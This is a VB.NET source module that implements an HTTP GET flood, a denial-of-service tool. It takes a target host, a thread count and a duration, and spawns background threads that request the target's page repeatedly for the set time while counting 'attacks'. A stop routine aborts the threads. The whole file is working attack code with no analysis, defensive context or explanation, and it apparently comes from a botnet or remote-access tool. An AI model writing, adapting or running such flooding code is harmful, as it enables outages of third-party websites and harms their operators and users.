﻿Imports System.Collections.Generic
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net
Imports System.Diagnostics
Public Module HTTPGet

    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Public Sub StartHTTPGet(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host

            ThreadstoUse = Threadsto
            TimetoAttack = Time
            Threads = New Thread(Threadsto - 1) {}
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else

        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            Attacks = 0
        End If

    End Sub

    Public Sub StopHTTPGET()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            Attacks = 0
        Else
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim lol As New System.Net.WebClient()
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    lol.DownloadString(HostToAttack)
                    lol.Dispose()
                    Attacks = Attacks + 1
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop


        Catch : End Try
        lol()
    End Sub
End Module
